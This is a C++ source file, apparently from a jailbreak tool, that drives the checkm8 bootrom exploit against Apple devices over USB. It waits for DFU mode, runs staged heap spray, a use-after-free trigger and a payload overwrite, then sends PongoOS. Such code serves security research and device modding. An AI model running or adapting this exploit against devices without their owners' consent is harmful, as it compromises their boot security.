#include "run.hpp"

#include <cstdlib>
#include <thread>
#include <atomic>

#include "../utils/log.h"

#ifndef __APPLE__
# include "usb-libusb.h"
#endif
#include "dfu.h"
#include "payload.h"
#include "checkm8.h"

std::atomic_bool stopThreads{false};

bool checkm8(enum ExploitMode mode) {
    usb_handle_t *handle = NULL;

    auto dfu_handle = std::make_unique<usb_handle_t>();
    auto pongo_handle = std::make_unique<usb_handle_t>();

    init_usb_handle(dfu_handle.get(), 0x5AC, 0x1227);
    init_usb_handle(pongo_handle.get(), 0x5AC, 0x4141);

    std::thread dfu_thread(wait_usb_handle, dfu_handle.get());
    std::thread pongo_thread(wait_usb_handle, pongo_handle.get());

    dfu_thread.detach();
    pongo_thread.detach();

    LOG("Waiting for device...");

    for (;;) {
        sleep_ms(200);

        if (dfu_handle->device) {
            LOG("Found device in DFU mode!");
            handle = dfu_handle.get();
            break;
        } else if (pongo_handle->device) {
            LOG("Found device in Pongo!");
            handle = pongo_handle.get();
            break;
        }
    }

    stopThreads = true;
    sleep_ms(200);
    stopThreads = false;

    struct DeviceConfiguration deviceConfig;
    struct PayloadConfiguration payloadConfig;
    bool ret = false;
    int stage = STAGE_PREPARE;

    while (stage != STAGE_DONE && wait_usb_handle(handle)) {
        switch (stage) {
            case STAGE_PREPARE: {
                LOG("Preparing device...");

                char *serialNumber = get_usb_device_serial_number(handle);
                if (!serialNumber) goto finished;

                if (!checkm8_find_device_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &deviceConfig)) { goto finished; }
                if (!checkm8_find_payload_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &payloadConfig)) { goto finished; }
                if (dfu_serial_number_is_in_yolo_dfu(serialNumber)) { LOG("Found device in Yolo DFU mode!"); stage = STAGE_PONGO; goto yolodfu; }
                if (device_serial_number_is_in_pongo_os(serialNumber)) { LOG("Found device in PongoOS!"); stage = STAGE_JAILBREAK; goto pongo; }
                else if (device_serial_number_is_in_pongo_os(serialNumber)) { LOG("Found device in PongoOS!"); return 0; }
                if (dfu_serial_number_is_pwned(serialNumber)) { LOG("Device is already pwned!"); return true; }
                if (!dfu_serial_number_is_in_dfu_mode(serialNumber)) { LOG("Device is not in DFU mode!"); return false; }

                free(serialNumber);
                stage = STAGE_RESET;
                goto reset;
            }
            case STAGE_RESET:
            reset:
                LOG("Resetting device...");
                ret = checkm8_reset(handle);
                LOG("Reset %s.", ret ? "succeeded" : "failed");
                stage = STAGE_HEAP_SPRAY;
            case STAGE_HEAP_SPRAY:
                LOG("Stage 1: heap spray...");
                ret = checkm8_heap_feng_shui(handle, &deviceConfig);
                LOG("Heap spray %s.", ret ? "succeeded" : "failed");
                stage = STAGE_TRIGGER;
            case STAGE_TRIGGER:
                LOG("Stage 2: trigger use-after-free...");
                ret = checkm8_trigger_UaF(handle, &deviceConfig);
                LOG("Trigger %s.", ret ? "succeeded" : "failed");
                stage = STAGE_PATCH;
            case STAGE_PATCH:
                LOG("Stage 3: payload execution...");
                ret = checkm8_send_overwrite_and_payload(handle, &deviceConfig, &payloadConfig);
                LOG("Patching %s.", ret ? "succeeded" : "failed");
                if (!ret) goto finished;
                close_usb_handle(handle);
                sleep_ms(3000);
                LOG("If your device is stuck on the Apple logo, please unplug and replug.");
                ret = wait_for_device_to_enter_yolo_dfu(handle);
                stage = ret ? STAGE_PONGO : STAGE_DONE;
            case STAGE_PONGO:
            yolodfu:
                LOG("Sending PongoOS...");
                ret = send_pongo_to_yolo_dfu(handle);
                stage = STAGE_JAILBREAK;
            case STAGE_JAILBREAK:
            pongo:
                LOG("Jailbreaking...");
                break;

            case STAGE_DONE:
                break;
        }

        if (stage != STAGE_JAILBREAK &&
            stage != STAGE_DONE &&
            stage != STAGE_PONGO)
        {
            reset_usb_handle(handle);
        }

        if (!ret && stage != STAGE_HEAP_SPRAY)
        {
            goto finished;
        }
    }

finished:
    if (ret) {
        LOG("%s succeeded.", mode == MODE_PONGOOS ? "Booting PongoOS" : "Exploit");
    } else {
        LOG("Exploit failed at stage %d!", stage == STAGE_PREPARE ? stage : stage - 1);
    }

    return ret;
}
